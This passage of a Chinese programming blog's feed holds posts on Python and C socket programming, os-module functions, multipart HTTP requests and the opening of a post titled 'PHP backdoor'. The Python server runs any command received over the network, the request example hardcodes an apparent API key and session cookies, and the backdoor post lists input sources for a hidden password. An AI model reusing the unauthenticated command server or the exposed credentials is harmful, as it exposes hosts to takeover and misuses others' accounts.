day5-socket-server.py</span></div><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="keyword">import</span> socket   <span class="comment">#socket模块</span></div><div class="line"><span class="keyword">import</span> commands   <span class="comment">#执行系统命令模块</span></div><div class="line">HOST=<span class="string">'10.0.0.245'</span></div><div class="line">PORT=<span class="number">50007</span></div><div class="line">s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)   <span class="comment">#定义socket类型，网络通信，TCP</span></div><div class="line">s.bind((HOST,PORT))   <span class="comment">#套接字绑定的IP与端口</span></div><div class="line">s.listen(<span class="number">1</span>)         <span class="comment">#开始TCP监听</span></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">       conn,addr=s.accept()   <span class="comment">#接受TCP连接，并返回新的套接字与IP地址</span></div><div class="line">       <span class="keyword">print</span><span class="string">'Connected by'</span>,addr    <span class="comment">#输出客户端的IP地址</span></div><div class="line">       <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">                data=conn.recv(<span class="number">1024</span>)    <span class="comment">#把接收的数据实例化</span></div><div class="line">               cmd_status,cmd_result=commands.getstatusoutput(data)   <span class="comment">#commands.getstatusoutput执行系统命令（即shell命令），返回两个结果，第一个是状态，成功则为0，第二个是执行成功或失败的输出信息</span></div><div class="line">                <span class="keyword">if</span> len(cmd_result.strip()) ==<span class="number">0</span>:   <span class="comment">#如果输出结果长度为0，则告诉客户端完成。此用法针对于创建文件或目录，创建成功不会有输出信息</span></div><div class="line">                        conn.sendall(<span class="string">'Done.'</span>)</div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                       conn.sendall(cmd_result)   <span class="comment">#否则就把结果发给对端（即客户端）</span></div><div class="line">conn.close()     <span class="comment">#关闭连接</span></div></pre></td></tr></table></figure>
<h3 id="5、Socket编程之客户端代码："><a href="#5、Socket编程之客户端代码：" class="headerlink" title="5、Socket编程之客户端代码："></a>5、Socket编程之客户端代码：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">root@yangrong:/python<span class="comment"># cat day5-socket-client.py</span></div><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="keyword">import</span> socket</div><div class="line">HOST=<span class="string">'10.0.0.245'</span></div><div class="line">PORT=<span class="number">50007</span></div><div class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)      <span class="comment">#定义socket类型，网络通信，TCP</span></div><div class="line">s.connect((HOST,PORT))       <span class="comment">#要连接的IP与端口</span></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">       cmd=raw_input(<span class="string">"Please input cmd:"</span>)       <span class="comment">#与人交互，输入命令</span></div><div class="line">       s.sendall(cmd)      <span class="comment">#把命令发送给对端</span></div><div class="line">       data=s.recv(<span class="number">1024</span>)     <span class="comment">#把接收的数据定义为变量</span></div><div class="line">        <span class="keyword">print</span> data         <span class="comment">#输出变量</span></div><div class="line">s.close()   <span class="comment">#关闭连接</span></div></pre></td></tr></table></figure>
<h3 id="6、程序缺限："><a href="#6、程序缺限：" class="headerlink" title="6、程序缺限："></a>6、程序缺限：</h3><p>这是一个简单的socket通信，里面存在一些bug</p>
<p>1.在客户端输入回车，会挂死。</p>
<p>2.服务端返回的数据大于1024，客户端显示不全。</p>
<p>3.单进程，如果多个客户端连接，要排队，前一个断开，后一个客户端才能通信。</p>
<p>不想把代码写的太复杂，简单的说下解决方案：</p>
<p>问题1.在客户端上判断输入为空，要求重新输入。</p>
<p>问题2.在客户端上循环接收，直到接收完。但有没有完客户端是不知道的，需要服务端发一个结束符。</p>
<p>问题3.在服务端导入SocketServer模块，使得每建立一个连接，就新创建一个线程。实现多个客户端与服务端通信。多线程通信原理如下图：</p>
<p><a href="http://img1.51cto.com/attachment/201312/000109234.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201312/000109234.jpg" alt="000109234.jpg"></a></p>
<h3 id="python-socket参考地址："><a href="#python-socket参考地址：" class="headerlink" title="python socket参考地址："></a>python socket参考地址：</h3><p><a href="http://blog.163.com/yi_yixinyiyi/blog/static/136286889201152814341144/" target="_blank" rel="external">http://blog.163.com/yi_yixinyiyi/blog/static/136286889201152814341144/</a></p>
<p><a href="http://blog.sina.com.cn/s/blog_4b5039210100ep72.html" target="_blank" rel="external">http://blog.sina.com.cn/s/blog_4b5039210100ep72.html</a></p>
<p><a href="http://blog.sina.com.cn/s/blog_523491650100hikg.html" target="_blank" rel="external">http://blog.sina.com.cn/s/blog_523491650100hikg.html</a></p>
]]></content>
      
        <categories>
            
            <category> code </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[socket编程]]></title>
      <url>/2017/09/04/c-socket%E7%BC%96%E7%A8%8B/</url>
      <content type="html"><![CDATA[<h3 id="Linux下的socket编程"><a href="#Linux下的socket编程" class="headerlink" title="Linux下的socket编程"></a>Linux下的socket编程</h3><h4 id="server-c"><a href="#server-c" class="headerlink" title="server.c"></a>server.c</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"> </div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_LINE 1024</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INET_ADDR_STR 16 </span></div><div class="line"> </div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">my_fun</span><span class="params">(<span class="keyword">char</span> *p)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span>(p == <span class="literal">NULL</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span>( ; *p != <span class="string">'\0'</span> ; p++)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>((*p &gt;= <span class="string">'a'</span>) &amp;&amp; (*p &lt;= <span class="string">'z'</span>))</div><div class="line">        &#123;</div><div class="line">            *p = *p - <span class="number">32</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span>     <span class="comment">//服务器通信地址结构</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">cin</span>;</span>     <span class="comment">//保存客户端通信地址结构</span></div><div class="line">    <span class="keyword">int</span> l_fd;</div><div class="line">    <span class="keyword">int</span> c_fd;</div><div class="line">    <span class="keyword">socklen_t</span> len;</div><div class="line">    <span class="keyword">char</span> buf[MAX_LINE];     <span class="comment">//存储传送内容的缓冲区</span></div><div class="line">    <span class="keyword">char</span> addr_p[INET_ADDR_STR]; <span class="comment">//存储客户端地址的缓冲区</span></div><div class="line">    <span class="keyword">int</span> port = <span class="number">8000</span>;</div><div class="line">    <span class="keyword">int</span> n;</div><div class="line">    bzero((<span class="keyword">void</span> *)&amp;<span class="built_in">sin</span>,<span class="keyword">sizeof</span>(<span class="built_in">sin</span>));</div><div class="line">    <span class="built_in">sin</span>.sin_family = AF_INET;   <span class="comment">//使用IPV4通信域</span></div><div class="line">    <span class="built_in">sin</span>.sin_addr.s_addr = INADDR_ANY;   <span class="comment">//服务器可以接受任意地址</span></div><div class="line">    <span class="built_in">sin</span>.sin_port = htons(port); <span class="comment">//端口转换为网络字节序</span></div><div class="line">     </div><div class="line">    l_fd = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);   <span class="comment">//创建套接子,使用TCP协议</span></div><div class="line">    bind(l_fd,(struct sockaddr *)&amp;<span class="built_in">sin</span>,<span class="keyword">sizeof</span>(<span class="built_in">sin</span>));</div><div class="line">     </div><div class="line">    listen(l_fd,<span class="number">10</span>);    <span class="comment">//开始监听连接</span></div><div class="line">     </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"waiting ....\n"</span>);</div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        c_fd = accept(l_fd,(struct sockaddr *)&amp;<span class="built_in">cin</span>,&amp;len);</div><div class="line">         </div><div class="line">        n = read(c_fd,buf,MAX_LINE);    <span class="comment">//读取客户端发送来的信息</span></div><div class="line">        inet_ntop(AF_INET,&amp;<span class="built_in">cin</span>.sin_addr,addr_p,INET_ADDR_STR);      <span class="comment">//将客户端传来地址转化为字符串</span></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"client IP is %s,port is %d\n"</span>,addr_p,ntohs(<span class="built_in">cin</span>.sin_port));</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"content is : %s\n"</span>, buf);   <span class="comment">//打印客户端发送过来的数据</span></div><div class="line">        my_fun(buf);</div><div class="line">        write(c_fd,buf,n);          <span class="comment">//转换后发给客户端</span></div><div class="line"> </div><div class="line">        close(c_fd);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"buf = %s\n"</span>,buf);</div><div class="line">    <span class="keyword">if</span>((close(l_fd)) == <span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"fail to close\n"</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="client-c"><a href="#client-c" class="headerlink" title="client.c"></a>client.c</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"> </div><div class="line"> </div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_LINE 1024</span></div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span>     <span class="comment">//服务器的地址</span></div><div class="line">    <span class="keyword">char</span> buf[MAX_LINE];</div><div class="line">    <span class="keyword">int</span> sfd;</div><div class="line">    <span class="keyword">int</span> port = <span class="number">8000</span>;</div><div class="line">    <span class="keyword">char</span> *str = <span class="string">"test string"</span>;</div><div class="line">    <span class="keyword">char</span> *serverIP = <span class="string">"127.0.0.1"</span>;</div><div class="line">    <span class="keyword">if</span>(argc &gt; <span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        str = argv[<span class="number">1</span>];  <span class="comment">//读取用户输入的字符串</span></div><div class="line">    &#125;</div><div class="line">    bzero((<span class="keyword">void</span> *)&amp;<span class="built_in">sin</span>,<span class="keyword">sizeof</span>(<span class="built_in">sin</span>));</div><div class="line">    <span class="built_in">sin</span>.sin_family = AF_INET;   <span class="comment">//使用IPV4地址族</span></div><div class="line">     </div><div class="line">    inet_pton(AF_INET,serverIP,(<span class="keyword">void</span> *)&amp;(<span class="built_in">sin</span>.sin_addr));</div><div class="line">    <span class="built_in">sin</span>.sin_port = htons(port);</div><div class="line">     </div><div class="line">    sfd = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</div><div class="line">     </div><div class="line">    connect(sfd,(struct sockaddr *)&amp;(<span class="built_in">sin</span>),<span class="keyword">sizeof</span>(<span class="built_in">sin</span>));</div><div class="line"> </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"str = %s\n"</span> , str);</div><div class="line">    write(sfd , str , <span class="built_in">strlen</span>(str) + <span class="number">1</span>);</div><div class="line">    read(sfd , buf , MAX_LINE);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"recive from server: %s\n"</span> , buf);</div><div class="line"> </div><div class="line">    close(sfd);</div><div class="line">     </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> code </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python </tag>
            
            <tag> c++ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python OS 文件/目录方法]]></title>
      <url>/2017/09/04/python-OS-%E6%96%87%E4%BB%B6-%E7%9B%AE%E5%BD%95%E6%96%B9%E6%B3%95/</url>
      <content type="html"><![CDATA[<p><strong>os</strong> 模块提供了非常丰富的方法用来处理文件和目录。</p>
<h4 id="os-pipe"><a href="#os-pipe" class="headerlink" title="os.pipe()"></a><a href="http://www.runoob.com/python/os-pipe.html" target="_blank" rel="external">os.pipe()</a></h4><p>创建一个管道，返回一对文件描述符(r,w)分别为读和写</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">stdinr,stdinw = os.pipe()</div><div class="line">stderrr,stderrw = os.pipe()</div><div class="line">os.write(stdinw, <span class="string">"\x00\x0a\x00\xff"</span>)</div><div class="line">os.write(stderrw, <span class="string">"\x00\x0a\x02\xff"</span>)</div><div class="line"></div><div class="line">proc = subprocess.Popen([<span class="string">"./input"</span>] + args, env=dict(os.environ, **env), stdin=stdinr, stderr=stderrr)</div></pre></td></tr></table></figure>
<blockquote>
<p>上述表示从标准输入中读入&quot;\x00\x0a\x00\xff&quot;，从标准错误中读入&quot;\x00\x0a\x02\xff&quot;</p>
</blockquote>
<h4 id="os-popen-command-mode-bufsize"><a href="#os-popen-command-mode-bufsize" class="headerlink" title="[os.popen(command, mode[, bufsize]])"></a>[os.popen(command<a href="http://www.runoob.com/python/os-popen.html" target="_blank" rel="external">, mode[, bufsize]])</a></h4><p>从一个 command 打开一个管道</p>
<ul>
<li><strong>command</strong> -- 使用的命令。</li>
<li><strong>mode</strong> -- 模式权限可以是 &#39;r&#39;(默认) 或 &#39;w&#39;。</li>
<li><strong>bufsize</strong> -- 指明了文件需要的缓冲大小：0意味着无缓冲；1意味着行缓冲；其它正值表示使用参数大小的缓冲（大概值，以字节为单位）。负的bufsize意味着使用系统的默认值，一般来说，对于tty设备，它是行缓冲；对于其它文件，它是全缓冲。如果没有改参数，使用系统的默认值。</li>
</ul>
<p><strong>返回值</strong></p>
<p>​    返回一个文件描述符号为fd的打开的文件对象</p>
<h4 id="os-open-file-flags-mode"><a href="#os-open-file-flags-mode" class="headerlink" title="os.open(file, flags[, mode])"></a><a href="http://www.runoob.com/python/os-open.html" target="_blank" rel="external">os.open(file, flags[, mode])</a></h4><p>打开一个文件，并且设置需要的打开选项，mode参数是可选的</p>
<ul>
<li><strong>file</strong> -- 要打开的文件</li>
<li><strong>flags</strong> -- 该参数可以是以下选项，多个使用 &quot;|&quot; 隔开：<ul>
<li><strong>os.O_RDONLY:</strong> 以只读的方式打开</li>
<li><strong>os.O_WRONLY:</strong> 以只写的方式打开</li>
<li><strong>os.O_RDWR :</strong> 以读写的方式打开</li>
<li><strong>os.O_NONBLOCK:</strong> 打开时不阻塞</li>
<li><strong>os.O_APPEND:</strong> 以追加的方式打开</li>
<li><strong>os.O_CREAT:</strong> 创建并打开一个新文件</li>
<li><strong>os.O_TRUNC:</strong> 打开一个文件并截断它的长度为零（必须有写权限）</li>
<li><strong>os.O_EXCL:</strong> 如果指定的文件存在，返回错误</li>
<li><strong>os.O_SHLOCK:</strong> 自动获取共享锁</li>
<li><strong>os.O_EXLOCK:</strong> 自动获取独立锁</li>
<li><strong>os.O_DIRECT:</strong> 消除或减少缓存效果</li>
<li><strong>os.O_FSYNC :</strong> 同步写入</li>
<li><strong>os.O_NOFOLLOW:</strong> 不追踪软链接</li>
</ul>
</li>
<li><strong>mode</strong> -- 类似 <a href="http://www.runoob.com/python/os-chmod.html" target="_blank" rel="external">chmod()</a>。</li>
</ul>
<p><strong>返回值</strong></p>
<p>返回新打开文件的描述符。</p>
<h4 id="os-read-fd-n"><a href="#os-read-fd-n" class="headerlink" title="os.read(fd, n)"></a><a href="http://www.runoob.com/python/os-read.html" target="_blank" rel="external">os.read(fd, n)</a></h4><p>从文件描述符 fd 中读取最多 n 个字节，返回包含读取字节的字符串，文件描述符 fd对应文件已达到结尾, 返回一个空字符串。</p>
<h4 id="os-write-fd-str"><a href="#os-write-fd-str" class="headerlink" title="os.write(fd, str)"></a><a href="http://www.runoob.com/python/os-write.html" target="_blank" rel="external">os.write(fd, str)</a></h4><p>写入字符串到文件描述符 fd中. 返回实际写入的字符串长度</p>
<h4 id="os-close-fd"><a href="#os-close-fd" class="headerlink" title="os.close(fd)"></a><a href="http://www.runoob.com/python/os-close.html" target="_blank" rel="external">os.close(fd)</a></h4><p>关闭文件描述符 fd</p>
]]></content>
      
        <categories>
            
            <category> code </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python中网络请求方式总结]]></title>
      <url>/2017/09/01/python%E4%B8%AD%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<p>python中能够发请求的包有很多种，有urllib、urllib2、urllib3、requests等，而且仅这几个python库，就能衍生出上百种请求方法，一一赘述明显不合适，这里仅仅讲述基础方法以及我所遇到的问题。</p>
<h4 id="发送multipart-form-data-数据"><a href="#发送multipart-form-data-数据" class="headerlink" title="发送multipart/form-data; 数据"></a>发送<code>multipart/form-data;</code> 数据</h4><p>有许多种情形下需要发送multipart/form-data数据，如文件上传、网络验证等</p>
<h5 id="方法一：用urllib2请求"><a href="#方法一：用urllib2请求" class="headerlink" title="方法一：用urllib2请求"></a>方法一：用urllib2请求</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> urllib</div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"></div><div class="line">header=&#123;</div><div class="line">    <span class="string">"Host"</span>: <span class="string">"api.surfeasy.com"</span>,</div><div class="line">    <span class="string">"Connection"</span>: <span class="string">"keep-alive"</span>,</div><div class="line">    <span class="string">"SE-Client-Locale"</span>: <span class="string">"zh-CN"</span>,</div><div class="line">    <span class="string">"Origin"</span>: <span class="string">"chrome-extension://odiddbcijempnhhobijfbggjogofdlgl"</span>,</div><div class="line">    <span class="string">"SE-Client-Type"</span>: <span class="string">"se0210"</span>,</div><div class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"</span>,</div><div class="line">    <span class="string">"SE-Client-Name"</span>: <span class="string">"odiddbcijempnhhobijfbggjogofdlgl"</span>,</div><div class="line">    <span class="string">"SE-Operating-System"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"</span>,</div><div class="line">    <span class="string">"SE-Client-API-Key"</span>: <span class="string">"DCF8EF2E5C791C25797F4F862EEF60DA7510BB4847058A8CE6357EFB4E692C79"</span>,</div><div class="line">    <span class="string">"SE-Client-Version"</span>: <span class="string">"1.3.6"</span>,</div><div class="line">    <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate, br"</span>,</div><div class="line">    <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8"</span>,</div><div class="line">    <span class="string">"Cookie"</span>: <span class="string">"api_session=BAhJIgGvZXlKcFpDSTZNVGt3TXpZNE1qVXNJbTltSWpvM056YzJNREF3TENKMGF5STZJbU01TW1ObU1UbGtOakppCk1qSXdNekZqWXpjd04yVmlNMlZtTUdWak9Ua3dOR1UwTVRGbFpUWXdNamxoWWpNNFl6QmpNbUptTURKaApNelZtWldWa04yRWlMQ0owYlNJNklqSXdNVGN0TVRFdE16QlVNRFU2TXpnNk1EaGFJbjA9CgY6BkVG--8d2bd7b8fab0d29ff09569e326d806e3d8b5ab22; api_session=BAhJIgGvZXlKcFpDSTZNVGt3TXpZNE1qVXNJbTltSWpvM056YzJNREF3TENKMGF5STZJakZtWlRZMVltRTJZV016Ck1HVXhNMlZtTkRSalpEWTJOMll5WkRJd1l6VmxObVkzTVRoaU4yRXhOakE1WVRWbVkyWTNNMk0wWm1ZMApPVFJqTXpRM1lqVWlMQ0owYlNJNklqSXdNVGN0TVRFdE16QlVNRGM2TURnNk5UUmFJbjA9CgY6BkVG--48a4f3899a63984d4061a64ae9864c8f9ecf2ad6"</span></div><div class="line">    &#125;</div><div class="line">data = <span class="string">'''--123456\r</span></div><div class="line">Content-Disposition: form-data; name="device_id"\r</div><div class="line">\r</div><div class="line">ab197fb4782f20bd5808133bdd8121ecd422ffb6\r</div><div class="line">--123456--\r</div><div class="line">'''</div><div class="line"><span class="comment">#print requests.post("https://api.surfeasy.com/v3/geo_lookup", verify=False, headers=header, data=data).text</span></div><div class="line">req = urllib2.Request(url=<span class="string">"https://api.surfeasy.com/v2/geo_list"</span>, headers=header)</div><div class="line">req.add_header(<span class="string">'Content-type'</span>, <span class="string">"multipart/form-data; boundary=123456"</span>)</div><div class="line">req.add_header(<span class="string">'Content-length'</span>, len(data))</div><div class="line">req.add_data(data)</div><div class="line"></div><div class="line"><span class="keyword">print</span> urllib2.urlopen(req).read() <span class="comment">#读取指定网站的内容</span></div></pre></td></tr></table></figure>
<font color="#f00">你会发现，我们竟然用post的方法进行了相应的请求！但是这里面有几处十分坑爹的地方</font>

<ol>
<li>boundary所包含的字符串一定是data中分界的字符串，并且一般以--boundary开头，以--boundary--结尾</li>
<li>注意data数据换行用\r\n或者\x0d\x0a来分割，最后结尾处也有\r\n</li>
<li>header头中的Content-type一定得有，但是Content-length却不是必须的</li>
<li>一般Content-Disposition: form-data;数据会先空一行，然后才是数据</li>
</ol>
<p>本内容参考的是:<a href="https://gist.github.com/zhenyi2697/5252801" target="_blank" rel="external">https://gist.github.com/zhenyi2697/5252801</a></p>
<h5 id="方法二：用requests请求"><a href="#方法二：用requests请求" class="headerlink" title="方法二：用requests请求"></a>方法二：用requests请求</h5><p>可能大家会说，requests多简单啊，其实确实是这样的，毕竟requests是专门为黑客开发的一套工具</p>
<blockquote>
<p> 当然，我们仍然可以利用上述的方法进行请求，我尝试过，仍然可以得到需要的结果！</p>
</blockquote>
<p>现在讲讲另外一种方法</p>
<p>在官方网站上，requests模拟一个表单数据的格式如下：</p>
<blockquote>
<p>files = {&#39;name&#39;: (<filename>, <file object="">,<content type="">, <per-part headers="">)}</per-part></content></file></filename></p>
<p>如果有多条内容，就在字典中加入多个内容。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">files = &#123;</div><div class="line">  &apos;device_id&apos;:(None,None,&quot;ab197fb4782f20bd5808133bdd8121ecd422ffb6&quot;)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>然后发送请求</p>
<blockquote>
<p> response=requests.post(url,files=files)</p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[php后门]]></title>
      <url>/2017/08/28/php%E5%90%8E%E9%97%A8/</url>
      <content type="html"><![CDATA[<h3 id="获取输入数据的手段"><a href="#获取输入数据的手段" class="headerlink" title="获取输入数据的手段"></a>获取输入数据的手段</h3><p>$\_GET[&quot;password&quot;]</p>
<p>$\_POST[&quot;password&quot;]</p>
<p>$\_REQUEST[&quot;password&quot;]</p>
<p>$\_COOKIE[&quot;password&quot;]</p>
<p>$\_GET[&quot;password&quot;]</p>
<p>$\_SERVER[&#39;HTTP_USER_AGENT&#39;]</p>
<p>$\_SERVER[&#39;HTTP_HOST&#39;]</p>
<p>$_SERVER[&#39;HTTP_REFERER&#39;]</p>
<p>$_SERVER[&#39;HTTP_ACCEPT_LANGUAGE&#39;]    // Accept-Language: </p>
<p>$_SERVER[&#39;HTTP_ACCEPT_CHARSET&#39;]    // Accept-Charset:</p>
<p>$_SERVER[&#39;QUERY_STRING&#39;]    /?abcdef</p>
<p>$_SERVER[&#39;HTTP_X\_FORWARDED\_FOR&#39;]</p>
<p>$_SERVER[&#39;HTTP_CONNECTION&#39;]    // Connection: </p>
<p>$_SERVER[&#39;HTTP_ACCEPT_ENCODING&#39;]  // Accept-Encoding: </p>
<p>$_SERVER[&#39;HTTP_ACCEPT&#39;]        // Accept: </p>
<p>$_SERVER[&#39;HTTP_VIA&#39;]        // Via: </p>
<p>$_SERVER[&#39;HTTP_CLIENT_IP&#39;]    // Client-IP:</p>
<p>$_SERVER[&#39;HTTP_UPGRADE_INSECURE_REQUESTS&#39;]    // Upgrade-Insecure-Requests:</p>
<p>$_SERVER[&quot;HTTP_CACHE_CONTROL&quot;]    // Cache-Control:</p>
<p>$_SERVER[&quot;HTTP_KEEP_ALIVE&quot;]            // Keep-Alive: </p>
<p>$\_SERVER[&quot;HTTP_AB_CD&quot;]        // Ab-Cd: </p>
<blockquote>
